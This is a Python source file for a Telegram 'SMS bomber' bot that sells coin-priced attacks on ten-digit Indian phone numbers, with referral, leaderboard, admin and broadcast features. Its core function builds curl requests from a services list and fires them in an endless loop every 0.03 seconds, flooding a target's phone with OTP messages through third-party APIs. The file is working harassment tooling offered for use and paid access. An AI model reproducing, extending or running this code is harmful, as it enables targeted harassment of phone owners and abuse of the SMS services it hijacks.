#!/usr/bin/env python
# (c) @lordzenox | @zenoxtool | @ghostpyo

import os, sys, json, subprocess, threading, logging, time, random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

from config import *
from database import *

# Initialize database
init_db()

# Disable logging
logging.basicConfig(level=logging.ERROR)
sys.stderr = open(os.devnull, 'w')

stop_bombing = {}
total_requests = {}
current_target = {}

# ---------- LOAD SERVICES ----------
def load_services():
    try:
        with open('services.json', 'r') as f:
            data = json.load(f)
            return data.get('services', [])
    except Exception as e:
        print(f"Error: {e}")
        return []

SERVICES = load_services()
print(f"✅ Loaded {len(SERVICES)} services")

# ---------- BUILD CURL COMMAND ----------
def build_curl(service, phone):
    method = service.get('method', 'POST')
    url = service.get('url', '').replace('{phone}', phone)
    headers = service.get('headers', {})
    data = service.get('data', {})
    phone_format = service.get('phone_format', 'raw')
    
    if phone_format == 'with_plus91':
        formatted_phone = f"+91{phone}"
    elif phone_format == '91-':
        formatted_phone = f"91-{phone}"
    else:
        formatted_phone = phone
    
    header_str = ""
    for key, value in headers.items():
        header_str += f' -H "{key}: {value}"'
    
    data_str = ""
    if data:
        if '_raw' in data:
            raw_data = data['_raw'].replace('{phone}', formatted_phone)
            data_str = f' -d "{raw_data}"'
        else:
            json_data = json.dumps(data)
            json_data = json_data.replace('{phone}', formatted_phone)
            json_data = json_data.replace('{{', '{').replace('}}', '}')
            data_str = f" -d '{json_data}'"
    
    url = url.replace('{phone}', formatted_phone)
    curl_cmd = f'curl -s -X {method} {header_str} {data_str} "{url}" > /dev/null 2>&1'
    return curl_cmd

# ---------- BOMBING FUNCTION ----------
def infinite(user_id, target):
    global stop_bombing, total_requests
    total_requests[user_id] = 0
    services = SERVICES.copy()
    random.shuffle(services)
    
    while not stop_bombing.get(user_id, False):
        for service in services:
            if stop_bombing.get(user_id, False):
                break
            try:
                curl_cmd = build_curl(service, target)
                subprocess.Popen(
                    curl_cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                total_requests[user_id] += 1
                time.sleep(0.03)
            except:
                pass
    return total_requests[user_id]

# ---------- CHECK COINS ----------
def can_use_bomb(user_id):
    balance = get_balance(user_id)
    if balance < BOMB_COST:
        return False, f"❌ Insufficient coins!\n💰 Balance: {balance} coins\n💸 Cost: {BOMB_COST} coins per bomb\n\nUse `/buy` to purchase more coins."
    return True, ""

# ---------- TELEGRAM COMMANDS ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name
    
    # Check if user exists
    if not get_user(user_id):
        # Check if referral code provided
        ref_code = None
        if context.args:
            ref_code = context.args[0]
        
        create_user(user_id, username, user.first_name, ref_code)
        welcome_msg = f"🎉 **Welcome {user.first_name}!**\n\n"
        welcome_msg += f"💰 You got **{FREE_COINS} FREE COINS**!\n"
        if ref_code:
            welcome_msg += f"👤 You were referred by someone!\n"
        welcome_msg += f"📢 Channel: {CHANNEL1}\n\n"
        welcome_msg += f"💀 Use `/help` to see all commands."
    else:
        user_data = get_user_stats(user_id)
        welcome_msg = f"👋 Welcome back **{user.first_name}**!\n"
        welcome_msg += f"💰 Balance: **{user_data['coins']}** coins\n"
        welcome_msg += f"💣 Total Bombs: **{user_data['total_bombs']}**\n\n"
        welcome_msg += f"💀 Use `/help` to see all commands."
    
    keyboard = [
        [InlineKeyboardButton("📢 Channel", url="https://t.me/zenoxtool")],
        [InlineKeyboardButton("👤 Owner", url="https://t.me/lordzenox")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = f"""
💀 **SMS BOMBER BOT - HELP**

**📊 Commands:**

/bomb `<number>` - Start bombing
/stop - Stop bombing
/balance - Check your coins
/refer - Get your referral link
/status - Check bot status
/buy - Purchase more coins
/leaderboard - Top users
/transactions - Your transaction history
/help - Show this help

**💰 Coin System:**
• New user: **{FREE_COINS} FREE** coins
• Referral bonus: **{REFERRAL_BONUS}** coins per referral
• Cost per bomb: **{BOMB_COST}** coins

**📢 Channels:**
{CHANNEL1}
{CHANNEL2}

**👤 Owner:**
{OWNER}
"""
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    coins = get_balance(user_id)
    ref_count = get_referral_count(user_id)
    stats = get_user_stats(user_id)
    
    msg = f"💰 **Your Balance**\n\n"
    msg += f"• Coins: **{coins}**\n"
    msg += f"• Total Bombs Used: **{stats['total_bombs']}**\n"
    msg += f"• Referrals: **{ref_count}**\n"
    msg += f"• Referral Bonus: **{ref_count * REFERRAL_BONUS}** coins\n\n"
    msg += f"💡 Refer friends and earn **{REFERRAL_BONUS}** coins each!"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Please use /start first")
        return
    
    ref_code = user[5]  # referral_code
    
    bot_username = (await context.bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={ref_code}"
    
    msg = f"🔗 **Your Referral Link**\n\n"
    msg += f"`{ref_link}`\n\n"
    msg += f"Share this link with your friends!\n"
    msg += f"💰 You get **{REFERRAL_BONUS}** coins per referral\n"
    msg += f"👤 Total Referrals: **{get_referral_count(user_id)}**"
    
    keyboard = [[InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=🔥 Join this awesome SMS Bomber Bot! Get free coins!")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode="Markdown")

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if user exists
    if not get_user(user_id):
        await update.message.reply_text("❌ Please use /start first")
        return
    
    # Check coins
    can_use, msg = can_use_bomb(user_id)
    if not can_use:
        await update.message.reply_text(msg, parse_mode="Markdown")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/bomb 9876543210`", parse_mode="Markdown")
        return

    target = context.args[0]
    if len(target) != 10 or not target.isdigit():
        await update.message.reply_text("❌ Enter a valid 10-digit number.")
        return

    if len(SERVICES) == 0:
        await update.message.reply_text("❌ No services loaded.")
        return

    # Deduct coins
    if not deduct_coins(user_id, BOMB_COST, f"Bomb used on +91{target}"):
        await update.message.reply_text("❌ Failed to deduct coins. Please try again.")
        return

    # Increment bomb count
    add_bomb_count(user_id)
    
    # Set stop flag false for this user
    stop_bombing[user_id] = False
    
    current_target[user_id] = target
    await update.message.reply_text(
        f"✅ **Bombing Started!**\n"
        f"📱 Target: `+91{target}`\n"
        f"📊 APIs: {len(SERVICES)}\n"
        f"💰 Coins Deducted: **{BOMB_COST}**\n"
        f"🔄 Balance: **{get_balance(user_id)}** coins\n"
        f"🛑 Press `/stop` to halt.",
        parse_mode="Markdown"
    )

    def run_bomb():
        global total_requests
        total = infinite(user_id, target)
        if stop_bombing.get(user_id, False):
            update.message.reply_text(
                f"⛔ **Stopped by User**\n"
                f"📱 `+91{target}`\n"
                f"📊 Total Requests: {total}",
                parse_mode="Markdown"
            )
        else:
            update.message.reply_text(
                f"✅ **Bombing Complete!**\n"
                f"📱 `+91{target}`\n"
                f"📊 Total Requests: {total}",
                parse_mode="Markdown"
            )

    threading.Thread(target=run_bomb, daemon=True).start()

async def stop_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_bombing[user_id] = True
    await update.message.reply_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_running = not stop_bombing.get(user_id, True)
    target = current_target.get(user_id, "None")
    requests = total_requests.get(user_id, 0)
    
    status_text = "🟢 **Running**" if is_running else "🔴 **Stopped**"
    msg = f"📊 **Bot Status**\n\n"
    msg += f"• Status: {status_text}\n"
    msg += f"• Target: `{target}`\n"
    msg += f"• APIs: {len(SERVICES)}\n"
    msg += f"• Requests Sent: {requests}\n"
    msg += f"• Balance: **{get_balance(user_id)}** coins"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users()
    if not users:
        await update.message.reply_text("No users found.")
        return
    
    msg = "🏆 **Leaderboard**\n\n"
    for i, (user_id, username, coins, bombs) in enumerate(users[:10], 1):
        name = username or f"User_{user_id}"
        msg += f"{i}. {name} - 💰 {coins} coins - 💣 {bombs} bombs\n"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

async def transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    trans = get_transactions(user_id)
    
    if not trans:
        await update.message.reply_text("📊 No transactions yet.")
        return
    
    msg = "📊 **Transaction History**\n\n"
    for amount, type_, desc, date in trans[:10]:
        emoji = "➕" if type_ == "credit" else "➖"
        msg += f"{emoji} **{abs(amount)}** coins - {desc}\n"
        msg += f"   `{date[:19]}`\n\n"
    
    await update.message.reply_text(msg, parse_mode="Markdown")

# ---------- ADMIN COMMANDS ----------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if user is admin (user_id matches ADMIN_ID)
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    keyboard = [
        [InlineKeyboardButton("💰 Add Coins", callback_data="admin_add_coins")],
        [InlineKeyboardButton("📊 All Users", callback_data="admin_users")],
        [InlineKeyboardButton("💀 Total Bombs", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔐 **Admin Panel**\n\nSelect an option:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized!")
        return
    
    data = query.data
    
    if data == "admin_add_coins":
        await query.edit_message_text(
            "💰 **Add Coins**\n\n"
            "Usage: `/addcoins <user_id> <amount>`\n\n"
            "Example: `/addcoins 123456789 50`",
            parse_mode="Markdown"
        )
    
    elif data == "admin_users":
        users = get_all_users()
        msg = "📊 **All Users**\n\n"
        for user_id, username, coins, bombs in users:
            name = username or f"User_{user_id}"
            msg += f"• {name} - 💰 {coins} coins - 💣 {bombs} bombs\n"
            if len(msg) > 3000:
                break
        await query.edit_message_text(msg, parse_mode="Markdown")
    
    elif data == "admin_stats":
        users = get_all_users()
        total_bombs = sum(user[3] for user in users)
        total_coins = sum(user[2] for user in users)
        msg = f"📊 **Bot Statistics**\n\n"
        msg += f"• Total Users: {len(users)}\n"
        msg += f"• Total Bombs Used: {total_bombs}\n"
        msg += f"• Total Coins: {total_coins}\n"
        await query.edit_message_text(msg, parse_mode="Markdown")
    
    elif data == "admin_broadcast":
        await query.edit_message_text(
            "📢 **Broadcast**\n\n"
            "Usage: `/broadcast <message>`\n\n"
            "Example: `/broadcast Hello everyone!`",
            parse_mode="Markdown"
        )

async def add_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
        return
    
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id or amount!")
        return
    
    add_coins(target_id, amount, f"Admin added {amount} coins")
    await update.message.reply_text(f"✅ Added **{amount}** coins to user `{target_id}`", parse_mode="Markdown")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    
    message = " ".join(context.args)
    users = get_all_users()
    
    sent = 0
    for user_id, username, coins, bombs in users:
        try:
            await context.bot.send_message(user_id, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            sent += 1
            time.sleep(0.1)
        except:
            pass
    
    await update.message.reply_text(f"✅ Broadcast sent to **{sent}** users!")

async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    msg = f"💰 **Purchase Coins**\n\n"
    msg += f"Contact the owner to purchase coins:\n\n"
    msg += f"👤 **Owner:** {OWNER}\n\n"
    msg += f"💳 **Prices:**\n"
    msg += f"• 50 coins - ₹X\n"
    msg += f"• 100 coins - ₹X\n"
    msg += f"• 500 coins - ₹X\n\n"
    msg += f"📩 Contact @lordzenox to buy!"
    
    keyboard = [[InlineKeyboardButton("👤 Contact Owner", url="https://t.me/lordzenox")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode="Markdown")

# ---------- MAIN ----------
def main():
    if not SERVICES:
        print("❌ No services loaded!")
        return
    
    # Make admin user in database
    make_admin(ADMIN_ID)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("refer", refer))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("stop", stop_bomb))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("leaderboard", leaderboard))
    app.add_handler(CommandHandler("transactions", transactions))
    app.add_handler(CommandHandler("buy", buy))
    
    # Admin commands
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("addcoins", add_coins))
    app.add_handler(CommandHandler("broadcast", broadcast))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="admin_.*"))
    
    print("=" * 50)
    print("🤖 SMS BOMBER BOT WITH REFERRAL SYSTEM")
    print(f"📊 Loaded {len(SERVICES)} services")
    print(f"👑 Owner: {OWNER}")
    print("=" * 50)
    app.run_polling()

if __name__ == "__main__":
    main()